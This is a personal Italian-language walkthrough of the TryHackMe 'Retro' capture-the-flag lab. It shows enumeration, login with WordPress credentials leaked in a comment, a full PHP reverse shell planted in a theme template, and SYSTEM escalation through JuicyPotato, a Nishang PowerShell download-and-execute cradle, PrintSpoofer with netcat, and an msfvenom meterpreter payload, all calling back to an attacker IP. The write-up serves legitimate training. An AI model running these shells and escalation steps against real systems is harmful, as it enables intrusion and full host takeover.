
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/retro?ref=blog.tryhackme.com

```
nmap -Pn -sV -O --open -p- 10.10.107.59
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 09:58 EST
Nmap scan report for 10.10.107.59
Host is up (0.051s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.14 seconds

```

```
gobuster dir -u http://10.10.107.59 -w /usr/share/wordlists/dirb/common.txt -t50
```
	nulla!

```
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.107.59/FUZZ
```
trovata
```
http://10.10.107.59/retro/
```

Un server web è in esecuzione sul target. Qual è la directory nascosta in cui risiede il sito web?
```
/retro
```


```
http://10.10.107.59/retro/index.php/2019/12/09/ready-player-one/#comment-2
```
troviamo in questa pagina info utili per loggarci
```
http://10.10.216.83/retro/wp-login.php
```
```
wade
```
```
parzival
```
il sito è un Wordpress 5.2.1 con dei plugin:
- Akismet Anti-Spam 4.1.2
- Absolute 1.6.0
- Make Paths Relative 1.1.2
- Relative URL 0.1.7

proviamo ad accedere prima sulla porta RDP aperta
```
xfreerdp /u:Wade /p:parzival /v:10.10.216.83
```

troviamo la flag sul desktop
```
3b99fbdc6d430bfb51c72c651a261927
```

```
whoami /All
```

```
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Fatto varie enumerazioni ma niente di che torniamo al WebServer
effettuiamo l'accesso a Wordpress e creiamo una shell inversa in uno dei Temi di pagina

```
http://10.10.216.83/retro/wp-login.php
```
```
wade
```
```
parzival
```

```
90s Retro: Main Index Template (index.php)
```

reverse shell per cmd 
```
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.11.116.149', 1234);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

```
nc -lvnp 1234
```
 ed inseriamo la reverse shell nells pagina del template index.php ,salviamo e facciamo Template Preview ed ==otteniamo la shell!==

```
whoami /all
```

```
USER INFORMATION
----------------

User Name         SID                                                            
================= ===============================================================
iis apppool\retro S-1-5-82-3788814120-2795558051-4026253505-1810414383-1644260341


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

dobbiamo scaricare il nostro exploit **Fresh potatoes**. Possiamo ottenere l'ultima versione [qui](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) . Dopo averlo scaricato nella nostra macchina, dobbiamo trasferirlo nel server. Apriamo un server Python Http e scarichiamolo dall'altro lato usando PowerShell.

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
Sulla nostra macchina eseguiamo questo modulo Python nella directory in cui abbiamo il nostro exploit:

```
sudo python3 -m http.server 8080
```

E dovremmo essere in grado di accedere al nostro server web utilizzando il nostro indirizzo IP:
```
c:\>mkdir temp

c:\>cd temp

c:\temp>powershell

```

```
Invoke-WebRequest http://10.11.116.149:8080/JuicyPotato.exe -outfile JuicyPotato.exe
```

```
PS C:\temp> Invoke-WebRequest http://10.11.116.149:8080/JuicyPotato.exe -outfile JuicyPotato.exe
PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----         2/7/2025   5:20 AM                Microsoft                     
-a----         2/7/2025   5:24 AM         347648 JuicyPotato.exe 
```


vediamo se possiamo eseguirlo sulla macchina da cmd
```
JuicyPotato.exe
```

quindi abbiamo anche bisogno di qualcosa da eseguire con l'eseguibile JuicyPotato. In questo caso, possiamo semplicemente usare un'altra Reverse Shell che farà apparire una SYSTEM shell dalla nostra parte.

Possiamo crearne uno con MSFVenom o scaricarne uno specifico per questo caso, come la shell inversa Nishang da [qui](https://github.com/samratashok/nishang) .
https://github.com/samratashok/nishang

Quindi scarichiamo **Invoke-PowerShellTcp.ps1** dalla directory Shells e salviamolo sulla nostra macchina. 
```
wget https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
```
Inoltre, aggiungiamo una nuova riga alla fine del file, contenente il seguente comando, sostituendo IP e Port con i nostri:

```
Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Porta>
```

```
nano Invoke-PowerShellTcp.ps1
```

```
.\Invoke-PowerShellTcp -Reverse -IPAddress 10.11.116.149 -Port 1212
```
Ora portiamo la nostra shell inversa sul server utilizzando la stessa procedura:
```
sudo python3 -m http.server 8080
```
```
Invoke-WebRequest http://10.11.116.149:8080/Invoke-PowerShellTcp.ps1 -outfile Invoke-PowerShellTcp.ps1
```
Shell inversa da utilizzare come payload con JuicyPotato

Ora ci serve solo qualcosa di eseguibile, per eseguire la nostra reverse shell e ottenere una shell con privilegi di SISTEMA dalla nostra parte. Creiamo un file .bat e scarichiamolo sul server usando lo stesso metodo. 
Il file .bat dovrebbe avere il seguente codice, con l'IP sostituito dal nostro indirizzo IP:

```
nano rshell.bat
```
```
PowerShell "IEX(New-Object Net.WebClient).downloadString('http://10.11.116.149/Invoke-PowerShellTcp.ps1')"
```

Ora dobbiamo scaricarlo sul server, utilizzando Invoke-WebRequest:
```
Invoke-WebRequest http://10.11.116.149:8080/rshell.bat -outfile rshell.bat
```
File bat da eseguire con JuicyPotato

E ora non ci resta che aprire un listener netcat dalla nostra parte, su una porta diversa da quella che stiamo attualmente utilizzando in questa shell:
```
nc -lvnp 1212
```
Ascoltatore Netcat sulla porta 4445 per la shell SYSTEM

Il flusso di questo attacco è più o meno questo:

- L'exploit JuicyPotato esegue il file .bat come SYSTEM
- Il file .bat con privilegi di SISTEMA scarica la nostra shell inversa Nishang e la esegue
- Otteniamo una shell di SISTEMA dalla nostra parte utilizzando un listener netcat

Quindi proviamo il nostro attacco e vediamo se otteniamo una shell SYSTEM dalla nostra parte. Possiamo usare JuicyPotato in questo modo:

```
.\JuicyPotato.exe -t * -p rshell.bat -l 9002
```

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.11.116.149 -Port 1212
```
se non funziona provare quest'altro metodo
- - -
Eseguendo `whoami /priv`possiamo vedere che abbiamo abilitato **SeImpersonatePrivilege**
Trasferisci [nc64.exe](https://github.com/sec-fortress/Exploits/blob/main/nc64.exe) e [PrintSpoofer32.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe) sul computer di destinazione
```
wget https://github.com/sec-fortress/Exploits/blob/main/nc64.exe
```

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
```

```
Invoke-WebRequest http://10.11.116.149:8080/nc64.exe -outfile nc64.exe
```

```
Invoke-WebRequest http://10.11.116.149:8080/PrintSpoofer32.exe -outfile PrintSpoofer32.exe
```
 ed esegui il comando seguente; assicurati inoltre di avviare il listener prima di eseguire questa operazione.
```
sudo nc -lvnp 443
```

```
.\PrintSpoofer32.exe -c "c:\temp\nc64.exe 10.11.116.149 443 -e cmd"
```
Se ci sono problemi con netcat provare con payload msfvenom!

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.116.149 LPORT=443 -f exe -o payload.exe
```

```
Invoke-WebRequest http://10.11.116.149:8080/payload.exe -outfile payload.exe
```

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp set
LHOST 10.11.116.149
set LPORT 443
exploit
```

```
.\PrintSpoofer32.exe -c "c:\temp\payload.exe 10.11.116.149 443 -e cmd"
```

```
 Directory of c:\Users\Administrator\Desktop

12/08/2019  08:06 PM    <DIR>          .
12/08/2019  08:06 PM    <DIR>          ..
12/08/2019  08:08 PM                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30,388,301,824 bytes free

c:\Users\Administrator\Desktop>type root.txt.txt 
type root.txt.txt
795xxxxxxxxxxxxxxxxx
c:\Users\Administrator\Desktop>

```

